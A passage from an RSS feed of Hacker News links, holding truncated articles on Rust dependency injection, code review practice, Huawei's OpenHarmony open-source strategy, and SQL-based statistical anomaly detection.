  <span>fn</span> <span>name</span><span>(</span><span>&amp;</span><span>self</span><span>)</span> <span>-&gt;</span> <span>&amp;</span><span>'static</span> <span>str</span> <span>{</span> <span>"MySQL"</span> <span>}</span>
<span>}</span>

<span>struct</span> <span>Postgres</span><span>;</span>
<span>impl</span> <span>Database</span> <span>for</span> <span>Postgres</span> <span>{</span>
  <span>fn</span> <span>name</span><span>(</span><span>&amp;</span><span>self</span><span>)</span> <span>-&gt;</span> <span>&amp;</span><span>'static</span> <span>str</span> <span>{</span> <span>"Postgres"</span> <span>}</span>
<span>}</span>

<span>struct</span> <span>WebServer</span> <span>{</span> <span>db</span><span>:</span> <span>Box</span><span>&lt;</span><span>dyn</span> <span>Database</span><span>&gt;</span> <span>}</span>
<span>impl</span> <span>WebServer</span> <span>{</span>
  <span>fn</span> <span>run</span><span>(</span><span>&amp;</span><span>self</span><span>)</span> <span>{</span>
    <span>println!</span><span>(</span><span>"Db name: {}"</span><span>,</span> <span>self</span><span>.db</span><span>.name</span><span>());</span>
  <span>}</span>
<span>}</span>
</code></pre></div></div>

<p>To implement DI, we need two things:</p>
<ul>
  <li>We need a way to register a global <code>Database</code> at runtime to a particular instance, e.g. <code>MySQL</code> or <code>Postgres</code>.</li>
  <li>We need a way to describe a constructor for <code>WebServer</code> that fetches the registered <code>Database</code> instance.</li>
</ul>

<p>With these pieces, we can use our DI system like so:</p>

<div><div><pre><code><span>let</span> <span>mut</span> <span>manager</span> <span>=</span> <span>DIManager</span><span>::</span><span>new</span><span>();</span>
<span>manager</span><span>.build</span><span>::</span><span>&lt;</span><span>MySQL</span><span>&gt;</span><span>()</span><span>.unwrap</span><span>();</span>
<span>let</span> <span>server</span> <span>=</span> <span>manager</span><span>.build</span><span>::</span><span>&lt;</span><span>WebServer</span><span>&gt;</span><span>()</span><span>.unwrap</span><span>();</span>
<span>server</span><span>.lock</span><span>()</span><span>.unwrap</span><span>()</span><span>.run</span><span>();</span> <span>// prints Db name: MySQL</span>
</code></pre></div></div>

<h3 id="di-constructors">DI constructors</h3>

<p>First, we‚Äôll define a trait <code>DIBuilder</code> that represents a constructor within our DI system.</p>

<div><div><pre><code><span>trait</span> <span>DIBuilder</span> <span>{</span>
  <span>type</span> <span>Input</span><span>;</span>
  <span>type</span> <span>Output</span><span>;</span>

  <span>fn</span> <span>build</span><span>(</span><span>input</span><span>:</span> <span>Self</span><span>::</span><span>Input</span><span>)</span> <span>-&gt;</span> <span>Self</span><span>::</span><span>Output</span><span>;</span>
<span>}</span>
</code></pre></div></div>

<p>The <code>build</code> method is a static method (doesn‚Äôt take <code>self</code> as input). It just takes <code>Input</code> as input, and produces <code>Output</code> as output. The key idea is that because <code>Input</code> and <code>Output</code> are <a href="https://doc.rust-lang.org/book/ch19-03-advanced-traits.html#specifying-placeholder-types-in-trait-definitions-with-associated-types">associated types</a>, we can inspect them later on. We will need to find values for <code>Input</code> and to store <code>Output</code> in our DI manager.</p>

<p>We implement <code>DIBuilder</code> for each type in the system. ‚Ä¶</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://willcrichton.net/notes/types-over-strings/">https://willcrichton.net/notes/types-over-strings/</a></em></p>]]>
            </description>
            <link>https://willcrichton.net/notes/types-over-strings/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24590364</guid>
            <pubDate>Fri, 25 Sep 2020 14:48:04 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[A Better Code Review]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24590342">thread link</a>) | @kiyanwang
<br/>
September 25, 2020 | https://www.giladpeleg.com/blog/better-code-review/ | <a href="https://web.archive.org/web/*/https://www.giladpeleg.com/blog/better-code-review/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><blockquote>
<p>"Everyone gets the experience. Some get the lesson." T.S. Eliot</p>
</blockquote>
<p>Contributing to a project is not an easy task, especially if you're new to the project, new to coding in general, or
just not an active contributor.</p>
<p>I have been on both sides, the contributing side and the reviewing side. I've made mistakes on both. The mistakes I
regret the most are the ones I've made on the reviewing side. Some are obvious, some are not. All of them could have
made the contributor's life, whether a developer on the team, or a contributor in an open source project, much easier.</p>
<p>A critical point to make, and something that I personally do not accept as a manager or as a developer, are actions
taken on either side which are made with bad intent. So while innocent mistakes are fine, we all make them, knowingly or
not, doing bad by intent is not acceptable behavior at all. Following up on the previous point,
by making intentional mistakes, I mean following imperfect guidelines, or having a
false perception of what's important or how to convey it, in contrast with having malicious intentions with your
actions.</p>
<h2 id="insignificant-factors"><a href="#insignificant-factors" aria-label="insignificant factors permalink"></a>Insignificant factors</h2>
<p>There is a big waste of time and energy in trivial, non-significant feedback. This complies perfectly with
<a href="https://en.wikipedia.org/wiki/Law_of_triviality">Parkinson's Law of Triviality</a>. People spend a disproportional amount
of time bothering with trivial details that have almost nothing to do with code semantics. From arguing about style,
function names, property names, names in general, spaces (or tabs), indentation (or lack of), braces, splitting code to
modules (or joining separate modules), extracting constants (almost religiously).</p>
<p>People also love premature optimizations (Which are known to be the
<a href="https://wiki.c2.com/?PrematureOptimization">root of all evil</a>). They do or suggest using LRU, sets instead of lists and
so many other factors, without any proven significant performance benefits, or that those are even needed. In general,
the program complexity seems to matter less than program correctness (or assumed correctness).</p>
<p>Why do we bother with such things?</p>
<ol>
<li>We underwent similar scrutiny when we were less experienced, and think it's great, or the correct path to becoming
better. Maybe it's simply something new trainees have to do.</li>
<li>People tend to spend less time thinking about the global effects of a change, and spend more time on the micro level.
This means reading and writing comments on a review as they process it. This prevents the reader from "Seeing the big
picture". Instead, we focus on tiny improvements, as if they were the important factor. "Improve this function's
name", "Extract this number as a constant.", all things we write that have almost no significant semantic code
impact. Why do we do them? They're easier to come up with, and they're also sometimes more obvious.</li>
<li>We didn't take the time removing any manual decisions about style from the review. Both the contributor and the
reviewer need to spend effort on reviewing style and this both wears them down, and simultaneously prevents them from
focusing on what matters. This is a key point I'll discuss later in <a href="#removing-obstacles">Removing obstacles</a>.</li>
<li>We find it hard to believe that
<a href="https://docs.microsoft.com/en-us/azure/devops/learn/devops-at-microsoft/code-reviews-not-primarily-finding-bugs#code-reviews-rarely-find-functional-bugs">code reviews rarely catch bugs</a>.
Yes, it's kind of shocking, we were all taught that code reviews are an effective tool for this kind of things.
They're not. They are effective for other things, discussed later in <a href="#the-important-stuff">The important stuff</a>. The
overall theme of thinking too highly about code reviews is basically science fiction. We should be spending our
energy elsewhere.</li>
<li>It's a form of control. This is a bit sad to say, and I've been there myself. Teams tend to be overly defensive about
their code and apply harsh review to external (to the team) contributors. They also sometimes apply this to more
junior developers, partly as a training tool and partly a control tool. Software code control is mostly a virtual
dance around a code repository. The alleged last defense (besides code quality tooling and deployment) is the code
review. Teams really believe it is their job to "protect the code", whatever that means, and their belief is
reinforced when they have to wake up at night due to changes done by external team members. One can say they should
have built better protective measures, or that they also wake up at night to their own changes, but it's very easy to
fall into this "guardian" trap after the n-th time they get a pager from an external person's change.</li>
<li>A form of control, but the bad kind. A person or persons are either taking care of their job security, or making sure
you know who is the owner (boss). This is a form of territorial battle, where someone who has the last word wins and
thus receives virtual fame and confidence, at least on paper. This happens a lot more than one would think it
happens, but in the end, code is written (at least in present day) by humans, who are a talking animal, but still an
animal, with a social ladder and animal-like behavior. I've been there, it's ugly. If you're in a company that has
this kind of stuff going on a lot, I suggest you run away.</li>
</ol>
<h2 id="the-important-stuff"><a href="#the-important-stuff" aria-label="the important stuff permalink"></a>The important stuff</h2>
<p>What should we use code-reviews for? To be perfectly honest, I'm not a big believer in pre-merge code-reviews (To be
explained later in <a href="#the-road-less-traveled">The road less traveled</a>). I've seen them weigh down development speed so
much, the added benefits might not be worth it. That said a code-review can be important when:</p>
<ol>
<li>The developer is new. Either entirely to the code-base or to coding. That developer is going to need feedback on both
how to code, how "we" code, and what's important to the team. In these regards, the code-review is being used as a
training class, and less than a device to add features. In a way, this is the asynchronous alternative to pair
programming or coding together.</li>
<li>Someone wanting to familiarize themselves with the code-base or changes made to it. That someone can be another
developer that you want to be aware of your new feature or changes, your tech lead or a senior engineer in the team.
A code-review helps them learn the inner-details of your new feature, that specific part of code that they don't
know, or just get better acquainted with the code-base. This means the code review is meant as an FYI to them, and in
most cases it shouldn't be blocking.</li>
<li>Reviewing system critical changes. Sometimes you do need or want an extra eye-ball on system critical changes.
Anything that can have a drastic effect on the system, from changing the way you run tests, to changing service
infrastructure, to super-hot code which is very performance oriented, to sensitive billing code. Those areas might be
worth the added blocking review, but I also assume those areas are less frequently edited.</li>
</ol>
<p>As a side, a lesser known point is that sometimes code-review are required as part of regulation policy the company is
complying with, such as SOC2. This makes code-reviewing changes required, though it doesn't make the insignificant
factors significant all of a sudden, so don't let that get in the way.</p>
<h2 id="removing-obstacles"><a href="#removing-obstacles" aria-label="removing obstacles permalink"></a>Removing obstacles</h2>
<p>As obvious as it may sound, you should be investing as much as you can in automating anything that can be automated in
code-reviews. This includes:</p>
<ol>
<li>Code formatting should be done automatically when developing and checked automatically on code-reviews. Not by a
human.</li>
<li>Automatic code linting (and any static analysis applied) should represent most of your style guide. In fact, I would
go further and say that if you can't build an automatic rule to at least warn about a style violation, you shouldn't
bring it up in code-reviews, ever. It's just not worth it. (This lesson I learned from a very smart friend who
enlightened me on this).</li>
<li>Testing, and quality assurance should both ease the pains for contributors, and increase confidence for maintainers.
If they don't - you should either delete or fix them. I've worked on code-bases where the tests would just slow down
the developer, never actually giving valid input. What are they useful besides wasting our time (or making it harder
to contribute)? Adding useful tests improves development speed and confidence, not slow it down. It also lowers the
blast radius, making errors less deadly in production (By allowing less brutal errors to pass through,
unintentionally).</li>
<li>Extending the previous points, I would go further and argue that any non-semantic review comments should be kept to a
minimum, preferably non-existent. Contributors should feel safe contributing, and know that even if they poorly named
their variable, everything is going to be ok, assuming their code still works. This can also be fixed in retrospect
(supporting post-merge workflows), as it has no semantic difference.</li>
</ol>
<p>Despite all the above, it is in my experience that developers find it very hard to let go of old practices. I know I
did. Once you understand the enormous negative side-benefits of focusing on the trivial stuff, you understand they are
waste of time and energy. To all sides.</p>
<p>A question I get asked sometimes is why should you allow bad code practices to slip through to your code, especially if
you're the owner of it, and a contributor is just passing through. My answer is simple.
You want the code review to be effective and focus <strong>only on what's important</strong>. Critical stuff you
might have missed. Everything else is a distraction meant to make the code prettier, but probably not better.</p>
<p>If you have concerns about code style add a linter. Add static rules that prevent adding this bad change. Better yet,
prefer automatic fixing of code style (when possible). Style should be a solved problem,
and I don't care what style it is - as long as I don't have to actively think about it
when contributing (or reviewing).</p>
<p>A thought that I always try to propagate is to treat others (contributors) as a reviewer the same as you would like to
be treated when contributing.</p>
<h2 id="harmful-stuff"><a href="#harmful-stuff" aria-label="harmful stuff permalink"></a>Harmful stuff</h2>
<p>Review comments have a style of their own. A lot has been written on reviewer hostility, and I'd like to assume you
understand how comments should be styled.</p>
<p>See <a href="https://medium.com/@sandya.sankarram/unlearning-toxic-behaviors-in-a-code-review-culture-b7c295452a3c">Unlearning toxic behaviors in a code review culture</a> for ‚Ä¶</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.giladpeleg.com/blog/better-code-review/">https://www.giladpeleg.com/blog/better-code-review/</a></em></p>]]>
            </description>
            <link>https://www.giladpeleg.com/blog/better-code-review/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24590342</guid>
            <pubDate>Fri, 25 Sep 2020 14:46:51 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[300 Years: Huawei's Open Source Strategy]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24590262">thread link</a>) | @ceohockey60
<br/>
September 25, 2020 | https://interconnected.blog/300-years-huawei-open-source-strategy/ | <a href="https://web.archive.org/web/*/https://interconnected.blog/300-years-huawei-open-source-strategy/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="english-version">
                        <p>Lost in the fog of TikTok was an important announcement: Huawei open sourced its homemade mobile operating system, HarmonyOS, now dubbed OpenHarmony. This announcement flew under the radar, but has far-reaching implications to not just the future of mobile technology, but also how that landscape will influence the geopolitical chess match between the U.S. and China.</p><p>But like many things that come out of China, it‚Äôs less a game of chess, but more a game of <a href="https://en.wikipedia.org/wiki/Go_(game)">Go</a>. </p><figure><img src="https://interconnected.blog/content/images/2020/09/huawei-oss-strategy_small-2.jpg" alt="" srcset="https://interconnected.blog/content/images/size/w600/2020/09/huawei-oss-strategy_small-2.jpg 600w, https://interconnected.blog/content/images/size/w1000/2020/09/huawei-oss-strategy_small-2.jpg 1000w, https://interconnected.blog/content/images/2020/09/huawei-oss-strategy_small-2.jpg 1568w" sizes="(min-width: 720px) 720px"></figure><h2 id="openharmony-the-technology">OpenHarmony: the Technology</h2><p>Let‚Äôs first get a handle on the technology that underpins OpenHarmony. Because the project started, first in 2012 and intensified in 2019, as a strategic initiative to reduce Huawei‚Äôs reliance on the Android operating system due to U.S. sanctions, many <a href="https://www.forbes.com/sites/davidphelan/2020/08/28/what-is-huaweis-smartphone-operating-system--should-i-buy-into-it/#4ca0a8311fd7">mistakenly believe</a> it is based on either Android or Linux (of which Android is based). <strong>That‚Äôs not true.</strong></p><p>OpenHarmony is based on another open source operating system called <a href="https://en.wikipedia.org/wiki/FreeBSD">FreeBSD</a>. Interestingly, Apple‚Äôs macOS and iOS also leveraged FreeBSD indirectly from another operating system project called Darwin. So, on a bits and bytes level, Huawei‚Äôs OpenHarmony is more similar to iOS than Android.</p><p>This is a smart decision because if the whole point is to reduce reliance on Android, the most important thing to avoid is co-mingling code with either Android or Linux in case it triggers obscure licensing restrictions. And the last thing a development team wants is to have technology licensing lawyers checking every line of code the engineers write, especially when they need to develop quickly to avoid an existential crisis, which is what Huawei has right now.</p><p>Because the project is open sourced, there‚Äôs a lot one can do now to evaluate and verify OpenHarmony. In fact, I verified the <a href="https://openharmony.gitee.com/openharmony/kernel_liteos_a/blob/master/bsd/arm/autoconf.c">FreeBSD lineage by rummaging through</a> its codebase, which is all hosted on Gitee. For readers who had a chance to read my previous post ‚Äú<a href="https://interconnected.blog/can-you-nationalize-open-source/"><strong>Can You ‚ÄòNationalize‚Äô Open Source?</strong></a>‚Äù, Gitee should sound familiar. It is a Git-based developer collaboration application that was recently anointed by the Ministry of Industry and Information Technology (MIIT) as the domestic ‚Äúnational champion‚Äù to drive open source growth in China. <strong>What I didn‚Äôt know when I wrote the previous post was that Huawei also became a strategic investor in Gitee in early September via </strong><a href="https://media.qimingpian.cn/qmp/b131b66d760b6b900485a1e30c2762f5.html"><strong>its corporate venture arm, Habo</strong></a><strong>.</strong></p><p>But as every open source technologist can attest, no project ever gets traction without a long period of steadfast community-building and credibility-building. That‚Äôs where the OpenAtom Foundation comes in.</p><h2 id="openatom-the-foundation">OpenAtom: the Foundation</h2><p>The OpenAtom Foundation is China‚Äôs first non-profit organization of its kind geared towards fostering open source technologies, much in the same way as the Linux Foundation or the Apache Software Foundation. <strong>Huawei drove the founding of this foundation, and OpenHarmony is its anchor project.</strong></p><p>But what is the point of a foundation anyway? As I‚Äôve written in ‚Äú<a href="https://interconnected.blog/covid-open-source-industrial-policy/"><strong>COVID, Open Source, Industrial Policy</strong></a>‚Äù, a foundation‚Äôs involvement can help open source technologies in two meaningful ways: <strong>accelerate development and vendor neutrality.</strong> In a nutshell, vendor neutrality is important because it allows other large companies to contribute in the development of an open source technology without fearing vendor lock-in by another company, thus leads to faster development of that technology. An example would be Kuberentes, an open source container orchestration software that was first created by Google but is now the anchor project for the <a href="https://www.cncf.io/">Cloud Native Computing Foundation</a> (CNCF); Kubernetes‚Äôs <a href="https://www.zdnet.com/article/kubernetes-and-containers-are-growing-up-fast-survey-shows/">fast growth</a> would not be possible if it still resides within Google.</p><p>While a foundation‚Äôs involvement is by no means necessary -- and many open source projects have become popular without a foundation‚Äôs support -- it does help. <strong>And that‚Äôs what the OpenAtom Foundation is trying to deliver for China‚Äôs technology ecosystem. </strong>Its model and value proposition is similar to that of the Linux Foundation: basically <strong>delivering foundation (thus neutrality) as a service</strong> to open source projects, including legal, IP trademark management, licensing, community building, joint marketing, etc.</p><p>An open source foundation is successful when it builds an ecosystem of technologies around the anchor project with a coherent theme. The Linux Foundation, of course, built an ecosystem around Linux with many ancillary and adjacent technologies around the ‚Äúopen source operating system‚Äù theme. &nbsp;The CNCF (a subsidiary foundation of the Linux Foundation) <a href="https://github.com/cncf/landscape/blob/master/README.md#trail-map">built an ecosystem</a> of technologies around Kubernetes and the ‚Äúcloud-native‚Äù theme.</p><p>While the OpenAtom Foundation is <a href="https://www.openatom.org/#/projectList">already hosting seven projects</a> as part of its launch, with a lofty goal of fostering open source software, hardware, semiconductors, and content (I‚Äôm assuming documentation and technical education), the only theme seems to be that all projects were created by Chinese companies. And besides OpenHarmony, whose strategic value to Huawei is clear, the other technologies seem trivial to their original creators:</p><ul><li><strong>Xuperchain</strong>, a blockchain infrastructure project from <strong>Baidu</strong></li><li><strong>TKEStack</strong> (a container orchestration layer based on Kubernetes) and <strong>TencentOS</strong> (an energy-efficient IoT operating system) from <strong>Tencent</strong></li><li><strong>AliOS</strong> (a light-weight IoT operating system) from <strong>Alibaba</strong></li><li><strong>PIKA</strong> (a storage system based on the open source database, Redis) from <strong>Qihoo360</strong></li><li><strong>UBML</strong> (a Unified Business Modeling Language modeling system) from <strong>Netease</strong><br></li></ul><figure><img src="https://lh4.googleusercontent.com/73XjJgCZnhJYxnCW4L8XjLFa9FHQbxAz7nYWTWmaGAsUVSW-L7TH7BurSGCj-H1sc2PnemuL2tuzm16EM7vxtBs8ydPAhQSHCHnsMidVpguJhBaU6hVavLasls45i76RPVNyGFbZ" alt=""></figure><p>If I have to surmise a future theme that is technology-focused and not nationality-focused, it would be IoT because when OpenHarmony was first unveiled in 2019 (as HarmonyOS), it was an IoT-focused operating system, like TencentOS and AliOS. But since then, its scope has broadened to include support for smartphones, watches, and smart TVs.</p><p>One other curious element about OpenAtom is that <strong>only two projects</strong> (OpenHarmony, TencentOS) are hosted on the ‚Äúnational champion‚Äù, <strong>Gitee</strong>, while <strong>four others</strong> (AliOS, PIKA, Xuperchain, TKE) are on <strong>GitHub</strong>. The remaining one, UBML from Netease, requires a developer to fill out a form to apply for access, which is a very developer-<em><strong>un</strong></em>friendly way to run an open source project.</p><h2 id="technology-foundation-developer-approval">Technology + Foundation = Developer Approval?</h2><p>That‚Äôs the hope anyway. The nirvana of an open source technology, with or without a foundation, is to achieve widespread participation and buy-in among developers, who will both make use of the technology at scale and contribute to its development. And if an <em>experienced</em> foundation gets involved to leverage its best practices in open source management, it can increase the success rate by reducing much of the messiness and common mistakes that often plague young open source projects.</p><p>In the case of Huawei though, <strong>OpenHarmony is a young project, and OpenAtom is an even younger foundation.</strong></p><p>The lazy and obvious conclusion here is to just dismiss all these efforts as a fool‚Äôs errand. <strong>But that‚Äôs not what you came to Interconnected for. </strong>The honest and nuanced conclusion is: <strong>it‚Äôs too early to tell and there are trends working both against and for Huawei‚Äôs open source strategy.</strong></p><h3 id="factors-against">Factors Against</h3><p>Huawei is infamous for its secretive ownership structure. Nobody knows exactly who or what owns Huawei. It‚Äôs a private Chinese LLC. It‚Äôs employee-owned, with 98.99% of company shares controlled by its employees via a ‚Äútrade union committee‚Äù. Allegedly, this committee pays dues to more senior trade unions in an opaque bureaucracy that ultimately leads to the All-China Federation of Trade Unions, which is controlled by the Chinese Communist Party (thus all the controversy). That‚Äôs why <a href="https://interconnected.blog/why-huawei-should-ipo-in-america/">I‚Äôve advocated for Huawei to IPO in New York</a> -- a bold act that would bring some desperately-needed credibility to the company.</p><p>Along the same vein, the OpenAtom Foundation also needs transparent, credible governance of its projects <em>and itself</em>. It currently boasts a 16-member Technical Oversight Committee (TOC), a typical governing element of an open source foundation, with Chinese technologists who have had years of experience working on projects in the Apache Software Foundation and Mozilla Foundation -- a good start. Their decision making process will have to be public and transparent to earn credibility from the wide developer community, both within and outside of China. As a reference, the <a href="https://github.com/cncf/toc/">CNCF TOC‚Äôs every governing deliberation</a> is viewable and commentable on GitHub. Because OpenAtom is, after all, a China-registered entity, to what degree it can deliver pure transparency is questionable.</p><p>Lastly, OpenHarmony‚Äôs birthright as a Chinese creation makes building neutrality and credibility harder than just about any other birthright on the planet. <strong>This is an obvious yet important point that every Chinese company is struggling with right now. It is an element that every Chinese immigrant living abroad has been struggling with for much longer. </strong>For a young project, OpenHarmony does have reasonably good documentation in both English and Chinese -- an important first step that must be continued for the long haul. Maintaining a bilingual presence (much like this blog) requires lots of extra hard work -- work that an American-born, German-born, or French-born project does not have to do. <strong>None of us can pick where we are born, but we all have to deal with its uneven consequences. There is no point in pretending that doesn‚Äôt exist.</strong></p><h3 id="factors-for">Factors For</h3><p>It‚Äôs not all doom and gloom for Huawei; there are a couple of factors potentially working in its favor. For one, the U.S.‚Äôs own credibility and neutrality when regulating cross-border technology businesses is also deteriorating. The Trump administration‚Äôs wheeling and dealing of TikTok is nothing short of cronyism, so much so that it has been called out by <a href="https://www.wsj.com/articles/trump-tiktok-and-crony-capitalism-11600639766?mod=hp_opin_pos_2">none other than the WSJ editorial board</a>. Although this doesn‚Äôt mean Huawei will have an opening to re-enter the U.S. market, other parts of the world may be more receptive to its technology. Regions like Southeast Asia, Latin America, the Middle East, and Africa are all credible possibilities. (See more in ‚Äú<a href="https://interconnected.blog/where-can-the-chinese-internet-go/"><strong>Where Can the Chinese ‚Ä¶</strong></a></p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://interconnected.blog/300-years-huawei-open-source-strategy/">https://interconnected.blog/300-years-huawei-open-source-strategy/</a></em></p>]]>
            </description>
            <link>https://interconnected.blog/300-years-huawei-open-source-strategy/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24590262</guid>
            <pubDate>Fri, 25 Sep 2020 14:39:07 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Simple Anomaly Detection Using Plain SQL]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24590126">thread link</a>) | @chmaynard
<br/>
September 25, 2020 | https://hakibenita.com/sql-anomaly-detection | <a href="https://web.archive.org/web/*/https://hakibenita.com/sql-anomaly-detection">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article data-progress-indicator="">
        <hr>
<p>Many developers think that having a critical bug in their code is the worst thing that can happen. Well, there is something much worse than that: Having a critical bug in your code and <strong>not knowing about it!</strong></p>
<p>To make sure I get notified about critical bugs as soon as possible, I started looking for ways to find anomalies in my data. I quickly found that information about these subjects tend to get very complicated, and involve a lot of ad-hoc tools and dependencies.</p>
<p>I'm not a statistician and not a data scientist, I'm just a developer. Before I introduce dependencies into my system I make sure I really can't do without them. So, <strong>using some high school level statistics and a fair knowledge of SQL, I implemented a simple anomaly detection system <em>that works</em>.</strong></p>
<figure><img alt="Can you spot the anomaly?<br><small>Photo by <a href=&quot;https://unsplash.com/photos/KmKZV8pso-s&quot;>Ricardo Gomez Angel</a></small>" src="https://hakibenita.com/images/00-sql-anomaly-detection.png"><figcaption>Can you spot the anomaly?<br><small>Photo by <a href="https://unsplash.com/photos/KmKZV8pso-s">Ricardo Gomez Angel</a></small></figcaption>
</figure>
<details open="">
   <summary>Table of Contents</summary>

</details>
<hr>

<hr>
<h2 id="detecting-anomalies"><a href="#detecting-anomalies">Detecting Anomalies</a></h2>
<p>Anomaly in a data series is a significant deviation from some reasonable value. Looking at this series of numbers for example, which number stands out?</p>
<div><pre><span></span>2, 3, 5, 2, 3, 12, 5, 3, 4
</pre></div>


<p>The number that stands out in this series is 12.</p>
<figure><img alt="Scatter plot" src="https://hakibenita.com/images/00-sql-anomaly-detection-scatter-plot.png"><figcaption>Scatter plot</figcaption>
</figure>
<p>This is intuitive to a human, but computer programs don't have intuition...</p>
<p>To find the anomaly in the series we first need to define what a reasonable value is, and then define how far away from this value we consider a significant deviation. A good place to start looking for a reasonable value is the mean:</p>
<div><pre><span></span><span>SELECT</span> <span>avg</span><span>(</span><span>n</span><span>)</span>
<span>FROM</span> <span>unnest</span><span>(</span><span>array</span><span>[</span><span>2</span><span>,</span> <span>3</span><span>,</span> <span>5</span><span>,</span> <span>2</span><span>,</span> <span>3</span><span>,</span> <span>12</span><span>,</span> <span>5</span><span>,</span> <span>3</span><span>,</span> <span>4</span><span>])</span> <span>AS</span> <span>n</span><span>;</span>

<span>       avg</span>
<span>‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ</span>
<span>4.3333333333333333</span>
</pre></div>


<p>The mean is ~4.33.</p>
<p>Next, we need to define the deviation. Let's use <a href="https://en.wikipedia.org/wiki/Standard_deviation" rel="noopener">Standard Deviation</a>:</p>
<div><pre><span></span><span>SELECT</span> <span>stddev</span><span>(</span><span>n</span><span>)</span>
<span>FROM</span> <span>unnest</span><span>(</span><span>array</span><span>[</span><span>2</span><span>,</span> <span>3</span><span>,</span> <span>5</span><span>,</span> <span>2</span><span>,</span> <span>3</span><span>,</span> <span>12</span><span>,</span> <span>5</span><span>,</span> <span>3</span><span>,</span> <span>4</span><span>])</span> <span>AS</span> <span>n</span><span>;</span>

<span>      stddev</span>
<span>‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ</span>
<span>3.0822070014844882</span>
</pre></div>


<p>Standard deviation is the square root of the <a href="https://en.wikipedia.org/wiki/Variance" rel="noopener">variance</a>, which is the average squared distance from the mean. In this case it's 3.08.</p>
<p>Now that we've defined a "reasonable" value and a deviation, we can define a <em>range</em> of acceptable values:</p>
<div><pre><span></span><span>SELECT</span>
   <span>avg</span><span>(</span><span>n</span><span>)</span> <span>-</span> <span>stddev</span><span>(</span><span>n</span><span>)</span> <span>AS</span> <span>lower_bound</span><span>,</span>
   <span>avg</span><span>(</span><span>n</span><span>)</span> <span>+</span> <span>stddev</span><span>(</span><span>n</span><span>)</span> <span>AS</span> <span>upper_bound</span>
<span>FROM</span>
   <span>unnest</span><span>(</span><span>array</span><span>[</span><span>2</span><span>,</span> <span>3</span><span>,</span> <span>5</span><span>,</span> <span>2</span><span>,</span> <span>3</span><span>,</span> <span>12</span><span>,</span> <span>5</span><span>,</span> <span>3</span><span>,</span> <span>4</span><span>])</span> <span>AS</span> <span>n</span><span>;</span>

<span>    lower_bound    ‚îÇ     upper_bound</span>
<span>‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îº‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ</span>
<span>1.2511263318488451 ‚îÇ 7.4155403348178215</span>
</pre></div>


<p>The range we defined is one standard deviation from the mean. Any value outside this range is considered an anomaly:</p>
<div><pre><span></span><span>WITH</span> <span>series</span> <span>AS</span> <span>(</span>
   <span>SELECT</span> <span>*</span>
   <span>FROM</span> <span>unnest</span><span>(</span><span>array</span><span>[</span><span>2</span><span>,</span> <span>3</span><span>,</span> <span>5</span><span>,</span> <span>2</span><span>,</span> <span>3</span><span>,</span> <span>12</span><span>,</span> <span>5</span><span>,</span> <span>3</span><span>,</span> <span>4</span><span>])</span> <span>AS</span> <span>n</span>
<span>),</span>
<span>bounds</span> <span>AS</span> <span>(</span>
   <span>SELECT</span>
       <span>avg</span><span>(</span><span>n</span><span>)</span> <span>-</span> <span>stddev</span><span>(</span><span>n</span><span>)</span> <span>AS</span> <span>lower_bound</span><span>,</span>
       <span>avg</span><span>(</span><span>n</span><span>)</span> <span>+</span> <span>stddev</span><span>(</span><span>n</span><span>)</span> <span>AS</span> <span>upper_bound</span>
   <span>FROM</span>
       <span>series</span>
<span>)</span>
<span>SELECT</span>
   <span>n</span><span>,</span>
   <span>n</span> <span>NOT</span> <span>BETWEEN</span> <span>lower_bound</span> <span>AND</span> <span>upper_bound</span> <span>AS</span> <span>is_anomaly</span>
<span>FROM</span>
   <span>series</span><span>,</span>
   <span>bounds</span><span>;</span>

<span>n  ‚îÇ is_anomaly</span>
<span>‚îÄ‚îÄ‚îÄ‚îº‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ</span>
<span> 2 ‚îÇ f</span>
<span> 3 ‚îÇ f</span>
<span> 5 ‚îÇ f</span>
<span> 2 ‚îÇ f</span>
<span> 3 ‚îÇ f</span>
<span><span>12 ‚îÇ t</span>
</span><span> 5 ‚îÇ f</span>
<span> 3 ‚îÇ f</span>
<span> 4 ‚îÇ f</span>
</pre></div>


<p>Using the query we found that the value 12 is outside the range of acceptable values, and identified it as an anomaly.</p>
<h3 id="understanding-z-score"><a href="#understanding-z-score">Understanding Z-Score</a></h3>
<p>Another way to represent a range of acceptable values is using a z-score. <a href="https://en.wikipedia.org/wiki/Standard_score" rel="noopener">z-score, or Standard Score</a>, is the number of standard deviations from the mean. In the previous section, our acceptable range was one standard deviation from the mean, or in other words, a z-score in the range ¬±1:</p>
